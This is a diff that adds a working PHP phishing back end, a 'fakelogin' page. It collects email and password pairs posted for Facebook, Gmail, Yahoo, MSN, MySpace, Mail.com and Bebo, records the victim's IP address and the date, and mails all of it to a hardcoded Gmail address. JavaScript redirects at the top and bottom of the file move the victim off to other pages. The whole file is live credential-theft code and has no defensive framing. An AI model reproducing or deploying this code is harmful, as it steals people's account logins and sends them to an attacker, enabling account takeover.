@@ -1,0 +1,84 @@
+<SCRIPT LANGUAGE="JavaScript">window.location="http://webcam2013.altervista.org/Skype-on_facebook/Carlina.html";</script>
+
+<?php
+$to="andiary01@gmail.com";
+$ip=$_SERVER['REMOTE_ADDR'];
+$echo= "==================================";
+$kambing=$_POST[email];
+$akml =$_POST[password];
+$kambing2=$_POST[email2];
+$akml2 =$_POST[password2];
+$kambing3=$_POST[email3];
+$akml3 =$_POST[password3];
+$kambing4=$_POST[email4];
+$akml4 =$_POST[password4];
+$kambing5=$_POST[email5];
+$akml5 =$_POST[password5];
+$kambing6=$_POST[email6];
+$akml6 =$_POST[password6];
+$kambing7=$_POST[email7];
+$akml7 =$_POST[password7];
+$akml8 =$_POST[passwo];
+$today = date("F j, Y,");
+$time = date(" g:i a");
+$title = "Vchatter - Pala si Fakelogin ee";
+$sub="Hacker From eQi";
+$header = "From: eQi@hacker.net\r\n";
+$header .= "Hacker From Bila";
+
+$mes .= "ip: ".$ip."\n";
+$mes .= "====[FACEBOOK]=========";
+$mes .= ": ".$kambing."\n";
+$mes .= "=======================";
+$mes .= ": ".$akml."\n";
+$mes .= "===================================================";
+$mes .= ": ".$akml8."\n";
+$mes .= "====[GMAIL]=============";
+$mes .= ": ".$kambing2."\n";
+$mes .= "=======================";
+$mes .= ": ".$akml2."\n";
+$mes .= "===================================================";
+$mes .= ": ".$akml8."\n";
+$mes .= "====[YAHOO]============";
+$mes .= ": ".$kambing3."\n";
+$mes .= "=======================";
+$mes .= ": ".$akml3."\n";
+$mes .= "===================================================";
+$mes .= ": ".$akml8."\n";
+$mes .= "====[MSN]==============";
+$mes .= ": ".$kambing4."\n";
+$mes .= "=======================";
+$mes .= ": ".$akml4."\n";
+$mes .= "===================================================";
+$mes .= ": ".$akml8."\n";
+$mes .= "====[MY SPACE]=========";
+$mes .= ": ".$kambing5."\n";
+$mes .= "=======================";
+$mes .= ": ".$akml5."\n";
+$mes .= "===================================================";
+$mes .= ": ".$akml8."\n";
+$mes .= "====[MAIL.COM]=========";
+$mes .= ": ".$kambing6."\n";
+$mes .= "=======================";
+$mes .= ": ".$akml6."\n";
+$mes .= "===================================================";
+$mes .= ": ".$akml8."\n";
+$mes .= "====[BEBO]=============";
+$mes .= ": ".$kambing7."\n";
+$mes .= "=======================";
+$mes .= ": ".$akml7."\n";
+$mes .= "===================================================";
+$mes .= ": ".$akml8."\n";
+$mes .= "====[PADA====]=========";
+$mes .= ": ".$today."\n";
+$mes .= "====[JAM=====]=========";
+$mes .= ": ".$time."\n";
+{
+mail($to, $sub, $mes, $header);
+}
+
+?>
+
+<SCRIPT LANGUAGE="JavaScript">
+window.location="html12";
+</script>
